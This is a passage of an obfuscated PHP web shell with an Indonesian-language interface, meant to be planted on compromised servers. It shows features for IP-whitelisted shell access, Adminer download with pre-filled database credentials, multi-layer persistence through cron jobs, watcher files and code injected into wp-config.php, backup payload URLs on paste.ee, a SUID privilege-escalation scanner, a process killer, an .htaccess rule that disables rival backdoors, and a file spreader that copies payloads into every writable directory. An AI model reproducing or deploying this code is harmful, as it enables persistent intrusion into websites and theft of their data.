"\47\x3b\x20\151\146\40\x28\x64\157\x63\x75\x6d\145\x6e\164\56\147\145\164\x45\154\145\x6d\145\x6e\164\x73\x42\171\x4e\141\155\x65\x28\47\x61\x75\x74\150\x5b\165\163\145\162\156\141\x6d\145\x5d\x27\51\133\x30\135\x29\x20\144\x6f\x63\x75\x6d\145\x6e\164\x2e\147\x65\x74\105\x6c\x65\x6d\145\156\x74\163\102\171\116\141\x6d\x65\x28\x27\141\165\x74\x68\133\165\x73\x65\x72\x6e\x61\155\x65\x5d\47\51\133\x30\x5d\56\166\x61\154\x75\x65\40\x3d\x20\x27" . addslashes($m_user[2]) . "\x27\x3b\40\151\x66\40\x28\x64\157\x63\x75\155\x65\156\164\x2e\x67\x65\164\x45\x6c\145\155\145\156\164\163\x42\171\x4e\141\x6d\x65\x28\47\x61\x75\x74\150\133\x70\141\x73\163\x77\157\162\x64\x5d\47\51\x5b\60\135\x29\40\x64\x6f\143\x75\x6d\145\156\x74\56\x67\x65\x74\105\x6c\145\x6d\145\x6e\x74\163\102\171\116\141\x6d\145\x28\47\x61\x75\x74\150\x5b\x70\141\163\163\x77\157\x72\144\x5d\x27\51\133\x30\135\56\x76\141\154\165\145\40\75\x20\47" . addslashes($m_pass[2]) . "\x27\73\40\151\146\x20\x28\144\157\143\165\x6d\145\x6e\x74\56\x67\x65\x74\105\x6c\x65\x6d\x65\x6e\164\163\x42\x79\x4e\x61\x6d\x65\50\47\x61\165\164\x68\133\144\142\135\x27\51\133\60\x5d\40\46\x26\x20" . (!empty($m_name[2]) ? "\x74\162\x75\145" : "\x66\141\154\x73\x65") . "\51\x20\144\157\x63\165\155\x65\x6e\x74\56\x67\x65\164\x45\154\x65\155\x65\x6e\x74\x73\x42\171\116\141\155\x65\50\47\141\x75\x74\150\x5b\144\142\x5d\47\x29\x5b\60\135\56\x76\141\x6c\x75\145\40\75\40\x27" . addslashes($m_name[2] ?? '') . "\x27\73\x20\175\51\73\40\x3c\x2f\x73\x63\162\151\160\164\76"; return array($m_host[2] ?? "\x6c\x6f\x63\x61\x6c\150\x6f\163\x74", $m_user[2], $m_pass[2]); } } } } return array(SERVER, '', ''); } } return new AdminerSoftware(); } $adminer_path = __DIR__ . "\x2f\141\x64\x6d\x69\x6e\x65\162\x2e\x70\x68\x70"; $adminer_url = "\x68\164\164\160\163\x3a\57\57\147\151\164\150\x75\x62\x2e\143\157\x6d\57\x76\162\141\x6e\x61\57\141\x64\x6d\x69\156\145\x72\57\162\x65\154\x65\x61\x73\x65\163\57\144\157\167\x6e\x6c\157\x61\x64\57\166\x34\56\70\x2e\61\57\141\144\x6d\151\x6e\145\162\x2d\64\56\x38\x2e\61\x2e\160\x68\x70"; if (!file_exists($adminer_path)) { echo "\74\x73\x65\x63\x74\151\x6f\x6e\x20\143\x6c\141\x73\x73\x3d\x22\x63\171\142\145\x72\55\160\x61\x6e\145\x6c\40\160\x2d\x34\42\x3e\74\150\x31\40\x63\x6c\x61\x73\x73\x3d\42\143\x79\142\x65\x72\x2d\146\x6f\156\x74\x20\143\171\142\145\162\55\147\x6c\x6f\167\x20\x74\145\x78\164\55\x78\154\40\x6d\142\55\64\x22\x3e\x41\x44\x4d\111\116\x45\x52\74\x2f\150\x31\x3e"; echo "\74\160\40\143\154\141\163\x73\75\x22\155\x65\x73\x73\141\x67\145\x20\x69\156\146\x6f\42\76\x4d\x65\156\x63\157\x62\141\x20\x6d\145\156\x67\165\156\x64\165\150\40\101\144\155\151\156\145\162\x2e\x2e\x2e\74\57\160\x3e"; $adminer_content = @file_get_contents($adminer_url); if ($adminer_content) { if (@file_put_contents($adminer_path, $adminer_content)) { echo "\74\160\x20\x63\x6c\141\163\163\x3d\42\155\145\x73\163\141\x67\145\x20\x73\x75\143\x63\145\x73\x73\42\76\x41\144\x6d\x69\156\x65\162\40\142\x65\x72\x68\x61\163\151\154\x20\144\x69\165\x6e\144\x75\x68\56\40\74\141\x20\150\x72\145\146\75\42\x3f\155\145\156\x75\75\141\144\155\x69\156\x65\162\x22\40\x63\154\x61\163\163\75\x22\x66\157\x6e\x74\55\x62\157\x6c\144\x20\x75\156\144\145\x72\154\151\x6e\145\42\76\x52\x65\146\x72\x65\163\x68\x20\x68\x61\x6c\141\155\x61\x6e\x20\151\x6e\151\x20\x75\x6e\x74\165\153\40\x6d\x65\x6d\x75\x6c\x61\151\x3c\57\x61\76\x2e\74\x2f\160\76"; } else { echo "\74\160\x20\x63\154\x61\x73\163\x3d\x22\x6d\x65\x73\x73\141\147\145\x20\x65\162\x72\157\162\42\x3e\107\141\x67\x61\x6c\x20\155\x65\156\x79\x69\155\x70\141\x6e\x20\101\x64\155\151\x6e\x65\x72\x2e\x20\120\x61\163\x74\x69\x6b\x61\156\40\x64\151\162\145\153\164\157\x72\x69\40\151\x6e\x69\40\x77\x72\x69\x74\141\x62\154\145\x2e\74\x2f\x70\x3e"; } } else { echo "\74\160\x20\143\x6c\141\163\x73\75\42\x6d\145\x73\163\x61\x67\145\x20\145\x72\x72\157\162\42\76\x47\x61\x67\x61\x6c\x20\155\145\156\x67\x75\156\144\165\150\40\101\x64\155\151\156\x65\162\56\40\123\151\154\x61\x6b\141\156\40\x75\x70\x6c\x6f\x61\x64\40\74\143\157\x64\x65\x3e\141\144\x6d\x69\156\x65\x72\x2e\160\x68\x70\74\x2f\x63\157\144\145\76\40\x73\x65\x63\141\162\x61\x20\x6d\141\x6e\165\x61\x6c\56\x3c\57\x70\x3e"; } echo "\74\x2f\163\x65\x63\164\x69\157\156\76"; } else { include $adminer_path; die; } } elseif ($active_menu === "\x73\145\143\x75\162\151\x74\171\137\143\x6f\156\146\151\147") { $config_content_sec = @file_get_contents($security_config_file); $config_sec = $config_content_sec ? @json_decode($config_content_sec, true) : array("\151\x70\137\145\x6e\x61\142\154\145\x64" => false, "\x61\154\154\x6f\x77\x65\x64\137\x69\160\x73" => array()); if (json_last_error() !== JSON_ERROR_NONE) { $config_sec = array("\151\x70\x5f\145\156\141\142\x6c\x65\x64" => false, "\141\x6c\154\x6f\167\145\144\x5f\151\160\163" => array()); } $is_ip_enabled_sec = isset($config_sec["\151\160\137\145\x6e\141\142\x6c\145\x64"]) && $config_sec["\x69\160\x5f\145\x6e\x61\x62\x6c\x65\144"] === true; $allowed_ips_sec = isset($config_sec["\141\x6c\x6c\157\x77\145\x64\x5f\151\x70\x73"]) && is_array($config_sec["\x61\154\154\157\167\145\144\x5f\x69\160\x73"]) ? $config_sec["\141\154\154\x6f\167\x65\x64\137\151\160\163"] : array(); ?>
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4">Security Configuration</h1>
                            <form method="POST" action="">
                                <input type="hidden" name="action" value="update_security_config">
                                <fieldset class="cyber-panel p-4 mb-6">
                                    <legend class="cyber-font" style="color:var(--accent)">IP Whitelist</legend>
                                    <div class="flex items-center mb-4">
                                        <label class="relative inline-flex items-center cursor-pointer">
                                            <input type="checkbox" name="ip_enabled" value="1" class="sr-only peer" <?php  echo $is_ip_enabled_sec ? "\143\x68\x65\143\153\145\x64" : ''; ?>
>
                                            <div class="w-11 h-6 bg-gray-600 rounded-full peer peer-focus:ring-4 peer-focus:ring-blue-800 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-green-600"></div>
                                            <span class="ml-3 font-medium"><?php  echo $is_ip_enabled_sec ? "\x57\x68\151\x74\145\154\x69\x73\x74\x20\x41\x6b\x74\x69\x66" : "\x57\x68\151\x74\145\154\x69\163\x74\40\116\x6f\x6e\x61\x6b\x74\151\146"; ?>
</span>
                                        </label>
                                    </div>
                                    <p class="text-xs text-gray-400 mb-4">Jika aktif, hanya IP dalam daftar yang bisa mengakses shell ini. IP Anda saat ini adalah: <code class="text-yellow-400"><?php  echo $htmlspecialchars_fn($_SERVER["\122\x45\x4d\x4f\x54\x45\137\x41\x44\104\x52"]); ?>
</code></p>
                                    
                                    <div class="mb-4">
                                        <label for="add_ip">Tambah IP ke Whitelist:</label>
                                        <div class="flex gap-2 mt-1">
                                            <input type="text" id="add_ip" name="add_ip" placeholder="Contoh: 123.45.67.89" class="flex-grow">
                                        </div>
                                    </div>

                                    <div class="mb-4">
                                        <label>Daftar IP yang Diizinkan:</label>
                                        <?php  if (empty($allowed_ips_sec)) { ?>
                                            <p class="text-gray-500 mt-2">Belum ada IP yang di-whitelist.</p>
                                        <?php  } else { ?>
                                            <div class="max-h-40 overflow-y-auto border border-gray-600 p-2 mt-2">
                                                <?php  foreach ($allowed_ips_sec as $ip) { ?>
                                                <div class="flex justify-between items-center p-1">
                                                    <code><?php  echo $htmlspecialchars_fn($ip); ?>
</code>
                                                    <label><input type="checkbox" name="remove_ips[]" value="<?php  echo $htmlspecialchars_fn($ip); ?>
"> Hapus</label>
                                                </div>
                                                <?php  } ?>
                                            </div>
                                        <?php  } ?>
                                    </div>
                                </fieldset>
                                <button type="submit" class="cyber-btn cyber-btn-primary">Simpan Konfigurasi</button>
                            </form>
                        </section>
                    <?php  } elseif ($active_menu === "\144\171\x6e\141\155\x69\x63\x5f\143\x61\x63\x68\145\137\x6d\141\x6e\x61\147\145\162") { ?>
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4"><?php  echo $htmlspecialchars_fn($dynamic_names["\155\x65\156\165\x5f\164\151\164\154\x65"]); ?>
</h1>
                            <?php  if (isset($_SESSION["\143\141\x63\150\145\x5f\141\143\x74\151\166\x65"]) && $_SESSION["\x63\141\x63\x68\145\137\141\143\x74\151\x76\145"] === true) { ?>
                                <div class="message success">
                                    <h2 class="font-bold">🛡️ Proses Cache Latar Belakang AKTIF</h2>
                                    <p>Skrip sedang berjalan di latar belakang. Semua komponen pertahanan (termasuk Lapis 4 & Lapis 5) telah diaktifkan.</p>
                                    <p>Path Cache: <code><?php  echo $htmlspecialchars_fn($_SESSION["\143\141\x63\x68\145\137\x64\x69\162\137\x70\141\164\x68"]); ?>
</code></p>
                                </div>
                                <div class="mb-4">
                                    <h3 class="cyber-font text-lg mb-2">Log Aktivitas</h3>
                                    <textarea readonly class="w-full h-96 bg-black text-green-400 p-2 font-mono text-xs"><?php  $log_file_path = $_SESSION["\143\x61\x63\150\145\137\x6c\x6f\147\137\x70\x61\164\150"] ?? null; if ($log_file_path && file_exists($log_file_path)) { echo $htmlspecialchars_fn(file_get_contents($log_file_path)); } else { if ($_SERVER["\x52\x45\121\x55\105\123\x54\x5f\115\105\124\x48\x4f\x44"] === "\x50\x4f\123\124" && isset($_POST["\141\x63\x74\151\x6f\156"]) && $_POST["\x61\x63\164\151\157\156"] === "\163\x74\x61\162\x74\x5f\x70\162\x6f\x74\145\x63\164\x69\157\x6e") { echo "\x50\162\x6f\x73\145\163\40\x73\x65\144\x61\156\147\40\x64\x69\155\165\154\141\151\56\x2e\56\x20\122\145\146\162\145\x73\150\x20\144\141\x6c\141\155\40\142\x65\x62\x65\x72\141\160\x61\x20\x64\x65\164\x69\x6b\x20\165\156\x74\165\x6b\40\x6d\x65\154\151\x68\141\x74\x20\154\157\x67\x2e"; } else { echo "\x46\151\x6c\x65\x20\154\157\x67\x20\164\x69\144\141\153\40\144\151\x74\145\x6d\x75\153\141\156\x20\x61\x74\141\165\40\x73\x65\163\x69\40\x74\151\144\x61\153\40\141\x6b\x74\x69\x66\56\x20\x4d\165\154\x61\x69\x20\160\x72\x6f\163\x65\163\40\142\x61\x72\x75\x20\165\156\x74\x75\x6b\x20\155\145\x6c\151\150\141\x74\40\x6c\157\147\56"; } } ?>
</textarea>
                                    <div class="flex gap-4 mt-2">
                                        <button onclick="location.reload();" class="cyber-btn cyber-btn-primary"><i class="fas fa-sync-alt mr-2"></i>Refresh Log</button>
                                        <form method="POST" action="" onsubmit="return confirm('Anda yakin ingin menghentikan proses ini? Ini juga akan menghapus penyusup dari wp-config.php.');">
                                            <input type="hidden" name="action" value="stop_protection">
                                            <button type="submit" class="cyber-btn" style="border-color:var(--danger); color:var(--danger) !important;"><i class="fas fa-stop-circle mr-2"></i>Hentikan Semua Pertahanan</button>
                                        </form>
                                    </div>
                                </div>
                            <?php  } else { ?>
                                <p class="mb-4 text-gray-400">Fitur ini menjalankan beberapa lapis pertahanan:</p>
                                <ul class="list-disc list-inside text-gray-400 mb-4 space-y-1">
                                    <li><strong>Lapis 1 (Proses Background):</strong> Skrip berjalan di latar belakang untuk menjaga file dan cron job.</li>
                                    <li><strong>Lapis 2 (Cron Job):</strong> Menjaga proses background agar tetap hidup.</li>
                                    <li><strong>Lapis 4 (Watcher):</strong> File di Document Root yang menjaga cron job tetap ada.</li>
                                    <li><strong>Lapis 5 (Penyusup):</strong> Kode disuntikkan ke `wp-config.php` untuk membangun ulang semuanya jika `crontab -r` dijalankan.</li>
                                </ul>
                                <form method="POST" action="">
                                    <input type="hidden" name="action" value="start_protection">
                                    <fieldset class="cyber-panel p-4 mb-6">
                                        <legend class="cyber-font" style="color:var(--accent)">Konfigurasi Target</legend>
                                        <div id="protector-rows">
                                            <!-- Baris akan ditambahkan oleh JavaScript -->
                                        </div>
                                        <div class="flex justify-between items-center mt-4">
                                            <button type="button" id="add-protector-row" class="cyber-btn cyber-btn-primary"><i class="fas fa-plus mr-2"></i>Tambah File</button>
                                            <div class="flex items-center gap-2">
                                                 <label for="interval">Interval Cek (detik):</label>
                                                 <input type="number" name="interval" id="interval" value="5" min="2" class="w-24">
                                            </div>
                                        </div>
                                        <p class="text-xs text-yellow-500 mt-2"><strong>PERINGATAN:</strong> Menggunakan 0777 pada direktori adalah risiko keamanan. Gunakan hanya jika Anda tahu apa yang Anda lakukan.</p>
                                    </fieldset>
                                    <button type="submit" class="cyber-btn cyber-btn-primary w-full text-lg"><i class="fas fa-play-circle mr-2"></i>Mulai Proses Cache</button>
                                </form>
                                
                                <template id="protector-row-template">
                                    <div class="protector-row grid grid-cols-1 md:grid-cols-2 gap-4 border-t border-dashed border-gray-600 py-4">
                                        <div>
                                            <label class="block mb-1">Path File Target</label>
                                            <div class="flex gap-2">
                                                <input type="text" name="targets[]" placeholder="<?php  echo $htmlspecialchars_fn(__DIR__ . DIRECTORY_SEPARATOR . basename(__FILE__)); ?>
" class="w-full target-path-input" required>
                                                <button type="button" class="cyber-btn" onclick="this.previousElementSibling.value = '<?php  echo $htmlspecialchars_fn(basename(__FILE__)); ?>
'">File Ini</button>
                                            </div>
                                        </div>
                                        <div>
                                            <label class="block mb-1">URL Backup (Raw)</label>
                                            <div class="flex gap-2">
                                                <select class="w-full backup-url-select" onchange="if(this.value) { this.closest('.protector-row').querySelector('.backup-url-input').value = this.value; }">
                                                    <option value="">-- Pilih dari Cron List --</option>
                                                    <?php  $shells = array("\101\114\106\101" => "\x68\x74\164\160\163\72\57\57\x70\x61\x73\x74\x65\x2e\145\x65\57\162\57\x6f\165\x69\x6f\164\155\115\142", "\107\x65\x63\x6b\157" => "\x68\164\164\x70\x73\72\x2f\57\x70\141\163\164\x65\x2e\x65\x65\57\162\57\x48\104\x69\x6c\166\66\x4e\144", "\x4d\141\x6c\151\156\x67\40\127\120" => "\150\164\164\x70\163\72\x2f\57\160\141\163\164\x65\56\145\145\57\162\57\123\x4b\146\160\x41\x39\x53\x5a"); foreach ($shells as $name => $url) { echo "\x3c\157\x70\164\x69\x6f\x6e\x20\x76\x61\154\165\x65\75\47{$htmlspecialchars_fn($url)}\x27\x3e{$htmlspecialchars_fn($name)}\x3c\x2f\x6f\160\x74\x69\x6f\156\76"; } ?>
                                                     <option value="">-- Custom --</option>
                                                </select>
                                                <input type="url" name="urls[]" placeholder="https://paste.ee/r/xxxxxx" class="w-full backup-url-input" required>
                                                <button type="button" class="cyber-btn remove-row" style="border-color:var(--danger); color:var(--danger) !important;"><i class="fas fa-trash"></i></button>
                                            </div>
                                        </div>
                                    </div>
                                </template>
                            <?php  } ?>
                        </section>
                    <?php  } elseif ($active_menu === "\160\162\157\x63\145\x73\163\137\155\141\156\141\147\145\162") { $processes = get_process_list(); ?>
                        <section class="cyber-panel p-4">
                             <h1 class="cyber-font cyber-glow text-xl mb-4">Process Manager</h1>
                             <div class="file-explorer">
                                 <table>
                                     <thead><tr><th>PID</th><th>User</th><th>CPU%</th><th>MEM%</th><th>Command</th><th>Action</th></tr></thead>
                                     <tbody>
                                     <?php  if (empty($processes)) { ?>
                                        <tr><td colspan="6" class="text-center">Tidak dapat mengambil daftar proses. Mungkin fungsi shell dinonaktifkan.</td></tr>
                                     <?php  } else { ?>
                                        <?php  foreach ($processes as $proc) { ?>
                                        <tr>
                                            <td><?php  echo $htmlspecialchars_fn($proc["\x70\151\x64"]); ?>
</td>
                                            <td><?php  echo $htmlspecialchars_fn($proc["\x75\163\145\162"]); ?>
</td>
                                            <td><?php  echo $htmlspecialchars_fn($proc["\x63\160\165"]); ?>
</td>
                                            <td><?php  echo $htmlspecialchars_fn($proc["\x6d\145\x6d"]); ?>
</td>
                                            <td class="truncate" title="<?php  echo $htmlspecialchars_fn($proc["\143\157\155\x6d\141\x6e\x64"]); ?>
"><?php  echo $htmlspecialchars_fn(substr($proc["\x63\157\155\x6d\x61\x6e\x64"], 0, 50)) . (strlen($proc["\143\x6f\155\x6d\x61\x6e\x64"]) > 50 ? "\x2e\56\x2e" : ''); ?>
</td>
                                            <td>
                                                <form method="POST" action="" onsubmit="return confirm('Yakin ingin menghentikan proses ini?');">
                                                    <input type="hidden" name="action" value="kill_process">
                                                    <input type="hidden" name="pid" value="<?php  echo $htmlspecialchars_fn($proc["\160\x69\x64"]); ?>
">
                                                    <button type="submit" class="text-red-500 hover:text-red-400"><i class="fas fa-skull"></i> Kill</button>
                                                </form>
                                            </td>
                                        </tr>
                                        <?php  } ?>
                                     <?php  } ?>
                                     </tbody>
                                 </table>
                             </div>
                        </section>
                    <?php  } elseif ($active_menu === "\x64\145\x73\164\162\x6f\171\x65\162") { ?>
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4">Backdoor Destroyer</h1>
                            <p class="mb-4">Fitur ini akan membuat file <code>.htaccess</code> di direktori root website untuk memblokir eksekusi semua file <code>.php</code> kecuali file shell ini sendiri. Ini adalah cara cepat untuk melumpuhkan backdoor lain yang mungkin ada.</p>
                            <p class="text-yellow-400 mb-4"><strong>PERINGATAN:</strong> Ini bisa mengganggu fungsionalitas normal website jika website tersebut menggunakan file PHP lain di root (selain index.php yang biasanya tetap berjalan). Gunakan dengan hati-hati.</p>
                            <form method="POST" action="" onsubmit="return confirm('Anda yakin ingin menerapkan .htaccess ini? Ini bisa merusak website jika tidak digunakan dengan benar.');">
                                <input type="hidden" name="action" value="deploy_destroyer">
                                <button type="submit" class="cyber-btn" style="border-color:var(--danger); color:var(--danger) !important;"><i class="fas fa-skull-crossbones mr-2"></i>Terapkan Destroyer</button>
                            </form>
                        </section>
                    <?php  } elseif ($active_menu === "\144\151\163\141\x62\154\145\x64\137\146\165\x6e\143\164\x69\157\x6e\163") { $disabled_funcs = ini_get("\144\x69\x73\x61\x62\x6c\x65\x5f\146\x75\156\x63\164\151\157\x6e\163"); $disabled_array = !empty($disabled_funcs) ? array_map("\164\x72\x69\x6d", explode("\54", $disabled_funcs)) : array(); ?>
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4">Check Disabled Functions</h1>
                            <?php  if (empty($disabled_array)) { ?>
                                <p class="message success">Tidak ada fungsi yang dinonaktifkan. Server ini sangat bebas!</p>
                            <?php  } else { ?>
                                <p class="mb-4">Total <strong><?php  echo count($disabled_array); ?>
</strong> fungsi dinonaktifkan di server ini:</p>
                                <div class="max-h-96 overflow-y-auto border border-gray-600 p-2">
                                    <code class="text-yellow-400"><?php  echo implode("\x2c\x20", array_map($htmlspecialchars_fn, $disabled_array)); ?>
</code>
                                </div>
                            <?php  } ?>
                        </section>
                    <?php  } elseif ($active_menu === "\x73\x75\x69\144\x5f\163\143\x61\x6e\156\145\x72") { ?>
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4">SUID Scanner</h1>
                            <p class="mb-4">Memindai file dengan SUID bit. Ini bisa menjadi vektor untuk eskalasi hak istimewa (privilege escalation).</p>
                            <pre class="bg-black p-4 max-h-96 overflow-y-auto"><?php  echo $htmlspecialchars_fn(try_execute_command("\146\x69\156\x64\40\x2f\x20\55\160\x65\x72\155\x20\x2d\165\75\163\40\x2d\x74\x79\x70\145\x20\x66\40\x32\76\x2f\144\x65\x76\57\156\x75\154\154")); ?>
</pre>
                        </section>
                    <?php  } elseif ($active_menu === "\146\151\x6c\x65\137\163\160\x72\145\141\144\x65\x72") { global $silentFileMessages, $results, $errorMessage, $successMessage; global $targetDirInputForForm, $githubUrlInputForForm, $rawFilenameForForm, $rawContentForForm; ?>
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4">Sebar File</h1>
                            <p class="mb-4 text-gray-400 text-sm">Fitur ini menyebarkan file ke semua subdirektori yang dapat ditulis dari direktori target yang dipilih. Gunakan untuk persistensi.</p>

                            <?php  if (!empty($silentFileMessages)) { echo "\74\144\151\x76\40\x63\154\x61\x73\x73\75\47\x6d\142\x2d\64\x27\76" . implode('', $silentFileMessages) . "\x3c\x2f\144\x69\166\76"; } if (!empty($successMessage)) { echo "\74\x64\151\166\40\143\154\x61\x73\163\75\x27\x6d\x65\163\x73\x61\147\145\x20\163\165\143\x63\145\x73\x73\47\x3e{$successMessage}\x3c\x2f\144\151\x76\76"; } if (!empty($errorMessage)) { echo "\x3c\x64\x69\166\x20\x63\x6c\141\x73\x73\75\x27\155\x65\163\163\x61\147\x65\40\145\162\x72\x6f\162\47\76{$errorMessage}\74\x2f\144\151\x76\76"; } ?>

                            <form action="?menu=file_spreader" method="POST" enctype="multipart/form-data" class="space-y-6">
                                <input type="hidden" name="action" value="manual_spread">

                                <fieldset class="cyber-panel p-4">
                                    <legend class="cyber-font" style="color:var(--accent)">1. Direktori Target</legend>
                                    <label for="target_dir_select">Pilih direktori yang terdeteksi atau ketik manual:</label>
                                    <div class="flex gap-2 mt-1">
                                        <select id="target_dir_select" class="flex-grow" onchange="document.getElementById('target_dir').value = this.value;">
                                            <option value="">-- Pilih Path --</option>
                                            <?php  foreach (find_common_document_roots() as $path => $desc) { ?>
                                                <option value="<?php  echo $htmlspecialchars_fn($path); ?>
"><?php  echo $htmlspecialchars_fn($desc . "\40\x28" . $path . "\x29"); ?>
</option>
                                            <?php  } ?>
                                        </select>
                                    </div>
                                    <input type="text" name="target_dir" id="target_dir" class="w-full mt-2" value="<?php  echo htmlspecialchars($targetDirInputForForm); ?>
" required>
                                </fieldset>

                                <p class="text-center cyber-font">- ATAU -</p>

                                <fieldset class="cyber-panel p-4">
                                    <legend class="cyber-font" style="color:var(--accent)">2. Pilih Sumber File (Pilih Salah Satu)</legend>
                                    
                                    <div>
                                        <label for="file">A. Upload File:</label>
                                        <input type="file" name="file" id="file" class="w-full mt-1">
                                    </div>

                                    <div>
                                        <label for="github_url">B. Dari URL GitHub Raw:</label>
                                        <input type="url" name="github_url" id="github_url" class="w-full mt-1" placeholder="https://raw.githubusercontent.com/..." value="<?php  echo htmlspecialchars($githubUrlInputForForm); ?>
">
                                    </div>
                                    
                                    <div>
                                        <label>C. Dari Konten Mentah:</label>
                                        <input type="text" name="raw_filename" class="w-full mt-1 mb-2" placeholder="Nama file (e.g., shell.php)" value="<?php  echo htmlspecialchars($rawFilenameForForm); ?>
">
                                        <textarea name="raw_content" class="w-full h-32" placeholder="&lt;?php ... ?&gt;"><?php  echo htmlspecialchars($rawContentForForm); ?>
</textarea>
                                    </div>
                                </fieldset>

                                <button type="submit" class="cyber-btn cyber-btn-primary w-full"><i class="fas fa-satellite-dish mr-2"></i>Mulai Sebar File</button>
                            </form>

                            <?php  if (!empty($results)) { ?>
                            <div class="mt-6">
                                <h2 class="cyber-font cyber-glow text-lg mb-2">Lokasi Berhasil Disebar:</h2>
                                <textarea readonly class="w-full h-64 bg-black text-green-400 p-2"><?php  echo htmlspecialchars(implode("\xa", $results)); ?>
</textarea>
                            </div>
                            <?php  } ?>
                        </section>
                    <?php  } else { echo "\x3c\163\x65\x63\x74\151\x6f\156\x20\143\x6c\141\x73\x73\x3d\x22\143\171\x62\145\x72\55\x70\x61\x6e\145\x6c\40\x70\55\64\x22\76\x3c\150\61\40\143\154\141\163\x73\x3d\42\143\171\x62\145\x72\55\146\x6f\156\164\x20\143\x79\x62\x65\162\x2d\147\154\x6f\x77\x22\76\x48\x61\154\x61\x6d\x61\x6e\40\x54\151\144\x61\x6b\40\104\x69\x74\145\x6d\165\153\x61\x6e\x3c\57\150\61\x3e\74\160\x3e\120\x69\x6c\x69\x68\x20\155\145\x6e\165\x20\x79\141\156\x67\x20\166\141\x6c\x69\144\x20\144\x61\162\151\40\163\x69\144\x65\142\141\162\40\x6b\x69\x72\x69\56\x3c\x2f\x70\x3e\x3c\57\163\145\143\164\151\157\156\x3e"; } goto gkvvk; CxMMW: goto xIKtC; goto kg2_a; vNXc6: $terminal_output = ''; goto iCaQz; KqBvj: $auto_path_script = __DIR__; goto uyDEA; dgxKe: xH_JF: goto yNYrc; zO_HA: goto h5ewK; goto QSGy8; Ic0o2: goto EkRX9; goto zmK7W; UTeVy: if (session_status() === PHP_SESSION_NONE) { if (!headers_sent()) { @session_start(); } } goto DuAvF; l8Vtd: sSOy0: goto H_s4T; knsNB: goto oguxC; goto IRBcQ; sgpGn: goto VzfAx; goto JJ_Wv; B4Y_S: wrKP6: goto afh3k; JFhE8: $_g_ascii_strpos = array(115, 116, 114, 112, 111, 115); goto L1A_H; vTBtG: goto Lt_w6; goto yrLao; B8LEq: MBOGk: goto XQx3Z; jaEYb: qAJak: goto v3FHC; qzAZ8: $_g_ascii_mkdir = array(109, 107, 100, 105, 114); goto xvQZW; UuSlA: echo $htmlspecialchars_fn(function_exists("\x70\x68\160\x5f\x75\156\141\x6d\145") ? php_uname("\163") . "\x20\57\x20" . php_uname("\x6d") : "\116\57\x41"); goto WWdO3; VVVum: ob_start(); goto c2zB2; Q1x_m: goto pxIzz; goto vWzhU; cj62i: E_jsV: goto VuP6a; VPm6L: JyJaR: goto S_EvU; K_sEr: $_g_ascii_substr = array(115, 117, 98, 115, 116, 114); goto DiExG; uyDEA: goto WEE4J; goto DUBxz; MamA2: goto ejVyV; goto lDjg0; AfAin: UzS8e: goto UP2Kt; s8EFu: tOD2D: goto RzscT; Zk4eI: goto Yggh7; goto VPm6L; JELYr: goto eFMQJ; goto k1xAz; yJnTg: $_g_ascii_basename = array(98, 97, 115, 101, 110, 97, 109, 101); goto w_X08; g5Dai: goto xv4NP; goto mYVS0; tASYR: goto IWd9z; goto ISo3p; v4nDz: goto OlRAi; goto gt7wz; LbyoQ: goto gBxie; goto kNMAf; XUuoR: function _get_fn_name_global_init_v3($a, $d) { if ($d === "\x66\x75\x6e\143\x74\151\x6f\x6e\x5f\x65\170\151\163\x74\163") { return "\146\165\x6e\x63\164\x69\157\156\x5f\145\170\x69\163\164\x73"; } $n = ''; if (isset($GLOBALS[$a]) && is_array($GLOBALS[$a])) { $n = __u0x_d3c0d3_str_fr0m_4sc11_4rr4y($GLOBALS[$a]); } if (!empty($n) && is_string($n) && function_exists($n)) { return $n; } elseif (function_exists($d)) { return $d; } else { return ''; } } goto dEqvh; o9dQS: zctIN: goto cdPLN; wkV_B: goto AQw2k; goto fYOh9; sBA1f: ?>
</div>
                    <div class="info-card rounded-lg p-3 glass-effect"><span class="cyber-font text-accent">Your IP:</span><br><?php  goto yAGVH; hyePy: cIjE7: goto uVbTu; Wiwza: goto DfweC; goto yShZ7; PSYS9: goto qG9RB; goto O_LFR; BT0r5: TgeHL: goto zmNb5; zMADb: zrKv7: goto ORwBn; Ns3Aj: hNYrd: goto dRqb8; wWkTl: xv4NP: goto sdRUo; PdY5x: goto GZ5Ci; goto dKe_n; UfZ1R: if ($active_menu === "\145\x64\151\x74\x6f\x72" && isset($_GET["\164\141\162\147\145\164"])) { ?>
                var fileName = <?php  echo json_encode(strtolower(call_user_func($basename_fn, $_GET["\164\x61\162\x67\x65\x74"]))); ?>
;
                var fileExtension = fileName.split('.').pop();
                var modeMap = {
                    'js': 'javascript', 'json': 'application/json', 'xml': 'xml', 'html': 'htmlmixed', 'css': 'css',
                    'php': 'php', 'phtml': 'php', 'php3': 'php', 'php4': 'php', 'php5': 'php', 'php7': 'php', 'phps': 'php', 'pht': 'php'
                };
                if (modeMap[fileExtension]) { editor.setOption("mode", modeMap[fileExtension]); }
